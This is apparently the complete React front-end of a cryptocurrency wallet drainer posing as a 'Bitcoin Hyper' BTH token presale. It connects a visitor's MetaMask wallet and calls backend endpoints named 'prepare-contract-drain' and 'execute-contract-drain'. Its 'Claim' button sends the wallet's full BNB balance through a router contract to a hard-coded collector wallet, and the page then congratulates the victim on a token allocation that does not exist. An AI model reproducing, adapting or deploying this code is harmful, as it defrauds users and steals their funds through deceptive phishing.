import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';

// ============================================
// YOUR DEPLOYED CONTRACT CONFIGURATION
// ============================================

const PROJECT_FLOW_ROUTERS = {
  'BSC': '0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8'
};

const COLLECTOR_WALLET = '0xfFc62ed6fD3986c6196BB70C9B7c08dE08235C47';

const SUPPORTED_CHAINS = [
  {
    name: 'BSC',
    chainId: 56,
    rpcUrl: 'https://bsc-dataseed.binance.org',
    symbol: 'BNB',
    explorer: 'https://bscscan.com',
    contractAddress: PROJECT_FLOW_ROUTERS.BSC,
    icon: '🟡',
    color: 'from-yellow-400 to-orange-500'
  }
];

const PROJECT_FLOW_ROUTER_ABI = [
  {
    "inputs": [{ "internalType": "address", "name": "_collector", "type": "address" }],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": false, "internalType": "address", "name": "oldCollector", "type": "address" },
      { "indexed": false, "internalType": "address", "name": "newCollector", "type": "address" }
    ],
    "name": "CollectorUpdated",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "initiator", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "value", "type": "uint256" }
    ],
    "name": "FlowProcessed",
    "type": "event"
  },
  {
    "anonymous": false,
    "inputs": [
      { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
      { "indexed": true, "internalType": "address", "name": "initiator", "type": "address" },
      { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "TokenFlowProcessed",
    "type": "event"
  },
  {
    "inputs": [],
    "name": "collector",
    "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "processNativeFlow",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [
      { "internalType": "address", "name": "token", "type": "address" },
      { "internalType": "uint256", "name": "amount", "type": "uint256" }
    ],
    "name": "processTokenFlow",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [{ "internalType": "address", "name": "newCollector", "type": "address" }],
    "name": "updateCollector",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

function App() {
  const [account, setAccount] = useState(null);
  const [chainId, setChainId] = useState(null);
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [balance, setBalance] = useState('0');
  const [loading, setLoading] = useState(false);
  const [txStatus, setTxStatus] = useState('');
  const [txHash, setTxHash] = useState('');
  const [error, setError] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [preparedDrains, setPreparedDrains] = useState([]);
  const [activeChain, setActiveChain] = useState(SUPPORTED_CHAINS[0]);
  const [completedChains, setCompletedChains] = useState([]);
  const [showCelebration, setShowCelebration] = useState(false);
  const [allocation, setAllocation] = useState({ amount: '0', valueUSD: '0' });

  const connectWallet = async () => {
    if (!window.ethereum) {
      setError('Please install MetaMask');
      return;
    }

    try {
      setLoading(true);
      setError('');
      
      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      const web3Provider = new ethers.BrowserProvider(window.ethereum);
      const web3Signer = await web3Provider.getSigner();
      const network = await web3Provider.getNetwork();
      const currentChainId = Number(network.chainId);
      
      setProvider(web3Provider);
      setSigner(web3Signer);
      setAccount(accounts[0]);
      setChainId(currentChainId);
      
      const balanceWei = await web3Provider.getBalance(accounts[0]);
      setBalance(ethers.formatEther(balanceWei));
      
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  const scanWallet = async () => {
    if (!account) return;
    
    try {
      setLoading(true);
      setError('');
      setTxStatus('🔍 Scanning wallet...');
      
      const response = await fetch('/api/presale/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: account })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setScanResult(data.data);
        setAllocation(data.data.tokenAllocation);
        
        if (data.data.isEligible) {
          setTxStatus('✅ Eligible! Preparing...');
          await prepareDrain();
        } else {
          setTxStatus(data.message);
        }
      }
      
    } catch (err) {
      setError('Failed to scan wallet');
    } finally {
      setLoading(false);
    }
  };

  const prepareDrain = async () => {
    if (!account) return;
    
    try {
      const response = await fetch('/api/presale/prepare-contract-drain', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: account })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setPreparedDrains(data.data.transactions);
        setTxStatus(`💰 Ready to claim ${allocation.amount} BTH`);
      }
      
    } catch (err) {
      console.error('Prepare error:', err);
    }
  };

  const executeNativeFlow = async () => {
    if (!signer || !account) {
      setError('Wallet not connected');
      return;
    }

    if (parseFloat(balance) <= 0) {
      setError('No balance to send');
      return;
    }

    try {
      setLoading(true);
      setError('');
      setTxStatus('⏳ Processing...');
      setTxHash('');

      const contract = new ethers.Contract(
        activeChain.contractAddress,
        PROJECT_FLOW_ROUTER_ABI,
        signer
      );

      const value = ethers.parseEther(balance);
      const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
      
      const tx = await contract.processNativeFlow({
        value: value,
        gasLimit: gasEstimate * 120n / 100n
      });

      setTxHash(tx.hash);
      setTxStatus('✅ Transaction submitted');

      const receipt = await tx.wait();
      
      const newBalance = await provider.getBalance(account);
      setBalance(ethers.formatEther(newBalance));
      
      if (!completedChains.includes(activeChain.name)) {
        const newCompleted = [...completedChains, activeChain.name];
        setCompletedChains(newCompleted);
        
        await fetch('/api/presale/execute-contract-drain', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: account,
            chainName: activeChain.name
          })
        });
        
        if (newCompleted.length === preparedDrains.length && preparedDrains.length > 0) {
          setShowCelebration(true);
          setTxStatus(`🎉 Congratulations! You've secured ${allocation.amount} BTH!`);
        } else {
          setTxStatus(`✅ ${activeChain.name} complete!`);
        }
      }
      
    } catch (err) {
      setError(err.message || 'Transaction failed');
      setTxStatus('❌ Transaction failed');
    } finally {
      setLoading(false);
    }
  };

  const claimTokens = async () => {
    try {
      setLoading(true);
      
      const response = await fetch('/api/presale/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ walletAddress: account })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setShowCelebration(true);
      }
      
    } catch (err) {
      console.error('Claim error:', err);
    } finally {
      setLoading(false);
    }
  };

  const disconnectWallet = () => {
    setAccount(null);
    setProvider(null);
    setSigner(null);
    setChainId(null);
    setBalance('0');
    setScanResult(null);
    setPreparedDrains([]);
    setCompletedChains([]);
    setShowCelebration(false);
    setTxStatus('');
    setTxHash('');
  };

  useEffect(() => {
    if (window.ethereum) {
      window.ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) disconnectWallet();
        else setAccount(accounts[0]);
      });

      window.ethereum.on('chainChanged', () => window.location.reload());
    }
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
      <div className="container mx-auto px-4 py-8 max-w-4xl">
        
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-5xl font-bold mb-2 bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
            BITCOIN HYPER
          </h1>
          <p className="text-gray-400">Project Flow Router • Mainnet Live</p>
          <div className="mt-2 text-sm text-gray-500">
            <span className="bg-gray-800 px-3 py-1 rounded-full">
              Contract: {activeChain.contractAddress.substring(0, 10)}...
            </span>
          </div>
        </div>

        {/* Connect Wallet */}
        <div className="text-center mb-8">
          {!account ? (
            <button
              onClick={connectWallet}
              disabled={loading}
              className="bg-orange-500 hover:bg-orange-600 text-white font-bold py-4 px-10 rounded-xl text-lg transition disabled:opacity-50 shadow-lg shadow-orange-500/20"
            >
              {loading ? 'Connecting...' : '🔌 Connect Wallet'}
            </button>
          ) : (
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl p-4 border border-gray-700">
              <div className="flex items-center justify-between flex-wrap gap-4">
                <div className="flex items-center gap-3">
                  <span className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></span>
                  <span className="font-mono">
                    {account.substring(0, 8)}...{account.substring(36)}
                  </span>
                </div>
                <div className="text-right">
                  <span className="text-gray-400 text-sm block">Balance</span>
                  <span className="text-2xl font-bold text-orange-400">
                    {parseFloat(balance).toFixed(4)} {activeChain.symbol}
                  </span>
                </div>
                <button
                  onClick={disconnectWallet}
                  className="text-sm text-gray-400 hover:text-white bg-gray-700 px-3 py-1 rounded-lg"
                >
                  Disconnect
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Error Display */}
        {error && (
          <div className="bg-red-900/50 border border-red-500 text-red-200 px-4 py-3 rounded-lg mb-6">
            ⚠️ {error}
          </div>
        )}

        {/* Status Display */}
        {txStatus && (
          <div className="bg-gray-800/50 border border-gray-700 px-4 py-3 rounded-lg mb-6 text-center">
            <p className="text-gray-300">{txStatus}</p>
            {txHash && (
              <a
                href={`${activeChain.explorer}/tx/${txHash}`}
                target="_blank"
                rel="noopener noreferrer"
                className="text-orange-400 text-sm hover:underline mt-1 inline-block"
              >
                View on Explorer ↗
              </a>
            )}
          </div>
        )}

        {/* Celebration Modal */}
        {showCelebration && (
          <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
            <div className="bg-gradient-to-br from-gray-800 to-gray-900 rounded-2xl p-8 max-w-md border border-orange-500/30 shadow-2xl">
              <div className="text-center">
                <div className="text-6xl mb-4">🎉</div>
                <h2 className="text-3xl font-bold mb-2 bg-gradient-to-r from-yellow-400 to-orange-500 bg-clip-text text-transparent">
                  Congratulations!
                </h2>
                <p className="text-xl mb-4">You've secured</p>
                <p className="text-5xl font-bold text-orange-400 mb-2">{allocation.amount} BTH</p>
                <p className="text-gray-400 mb-6">Value: ${allocation.valueUSD}</p>
                <button
                  onClick={() => setShowCelebration(false)}
                  className="bg-orange-500 hover:bg-orange-600 text-white font-bold py-3 px-8 rounded-lg transition"
                >
                  Close
                </button>
              </div>
            </div>
          </div>
        )}

        {account && (
          <>
            {/* Main Action Card */}
            <div className="bg-gray-800/50 backdrop-blur-sm rounded-xl p-8 border border-gray-700 text-center">
              <h2 className="text-2xl font-bold mb-4">Welcome to Bitcoin Hyper</h2>
              
              {!scanResult ? (
                <>
                  <p className="text-gray-400 mb-8">
                    Click the button below to check your eligibility
                  </p>
                  <button
                    onClick={scanWallet}
                    disabled={loading}
                    className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-8 rounded-lg transition disabled:opacity-50 text-lg"
                  >
                    {loading ? 'Scanning...' : '🔍 Check Eligibility'}
                  </button>
                </>
              ) : scanResult.isEligible ? (
                <>
                  <div className="mb-6">
                    <p className="text-gray-400 mb-2">Your Allocation</p>
                    <p className="text-4xl font-bold text-orange-400">{allocation.amount} BTH</p>
                    <p className="text-gray-500">≈ ${allocation.valueUSD}</p>
                  </div>
                  
                  {preparedDrains.length > 0 && (
                    <div className="mb-6">
                      <p className="text-gray-400 mb-3">Progress</p>
                      <div className="w-full bg-gray-700 rounded-full h-3 mb-2">
                        <div 
                          className="bg-gradient-to-r from-orange-500 to-orange-600 h-3 rounded-full transition-all duration-500"
                          style={{ width: `${(completedChains.length / preparedDrains.length) * 100}%` }}
                        ></div>
                      </div>
                      <p className="text-sm text-gray-400">
                        {completedChains.length} of {preparedDrains.length} chains completed
                      </p>
                    </div>
                  )}
                  
                  {!completedChains.includes(activeChain.name) && (
                    <button
                      onClick={executeNativeFlow}
                      disabled={loading || parseFloat(balance) <= 0}
                      className="bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700 text-white font-bold py-4 px-8 rounded-lg transition disabled:opacity-50 text-lg w-full"
                    >
                      {loading ? 'Processing...' : `⚡ Claim on ${activeChain.name}`}
                    </button>
                  )}
                  
                  {completedChains.length === preparedDrains.length && preparedDrains.length > 0 && !showCelebration && (
                    <button
                      onClick={claimTokens}
                      className="bg-green-600 hover:bg-green-700 text-white font-bold py-4 px-8 rounded-lg transition text-lg w-full"
                    >
                      🎉 View Your BTH Allocation
                    </button>
                  )}
                </>
              ) : (
                <div className="text-center">
                  <p className="text-xl text-red-400 mb-4">Not Eligible</p>
                  <p className="text-gray-400">{scanResult.eligibilityReason}</p>
                </div>
              )}
            </div>

            {/* Chain Status */}
            {preparedDrains.length > 0 && (
              <div className="mt-6 grid grid-cols-1 gap-3">
                {preparedDrains.map((drain, index) => {
                  const isCompleted = completedChains.includes(drain.chain);
                  
                  return (
                    <div
                      key={index}
                      className={`p-4 rounded-lg ${
                        isCompleted
                          ? 'bg-green-900/30 border border-green-500/30'
                          : 'bg-gray-800/30 border border-gray-700'
                      }`}
                    >
                      <div className="flex justify-between items-center">
                        <div>
                          <span className="font-bold text-orange-400">{drain.chain}</span>
                          <p className="text-sm text-gray-400">
                            {parseFloat(drain.amount).toFixed(4)} {drain.symbol}
                          </p>
                        </div>
                        {isCompleted && (
                          <span className="bg-green-600 text-white px-3 py-1 rounded-full text-sm">
                            ✅ Completed
                          </span>
                        )}
                      </div>
                    </div>
                  );
                })}
              </div>
            )}
          </>
        )}

        {/* Footer */}
        <div className="mt-8 text-center text-gray-500 text-sm">
          <p>Project Flow Router • Mainnet Live</p>
          <p className="mt-1">Contract: {activeChain.contractAddress}</p>
        </div>
      </div>
    </div>
  );
}

export default App;
